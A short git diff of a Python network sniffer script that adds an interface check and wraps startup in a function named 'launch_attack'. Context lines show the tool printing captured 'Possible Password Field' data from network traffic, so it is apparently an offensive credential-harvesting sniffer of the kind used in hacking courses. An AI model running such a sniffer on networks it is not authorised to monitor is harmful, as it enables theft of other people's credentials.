@@ -10,8 +10,10 @@ import argparse
 
 def get_arguements():
     parser = argparse.ArgumentParser()
-    parser.add_argument("-i", "--interface", dest="interface", help="Interface to Listen on")
+    parser.add_argument("-i", "--interface", dest="interface", help="Interface to Sniff on.")
     options = parser.parse_args()
+    if not options.interface:
+        parser.error(colored("[-] Interface not Specified. Use -h to display help"))
     return options
 
 def sniff_packets(interface):
@@ -38,6 +40,12 @@ def process_packets(packet):
         print(colored("\n[+] Possible Password Field >> ", "yellow") + creds_load + "\n")
         print("==============================================")
 
-options = get_arguements()
-print(colored(f"[+] Sniffer running on {options.interface}. Waiting for Traffic..", "green"))
-sniff_packets(options.interface)
+def launch_attack():
+    try:
+        options = get_arguements()
+        print(colored(f"[+] Sniffer running on {options.interface}. Waiting for Traffic..", "green"))
+        sniff_packets(options.interface)
+    except KeyboardInterrupt:
+        print(colored("\n[-] Ctrl+C detected, Quitting..", "yellow"))
+
+launch_attack()
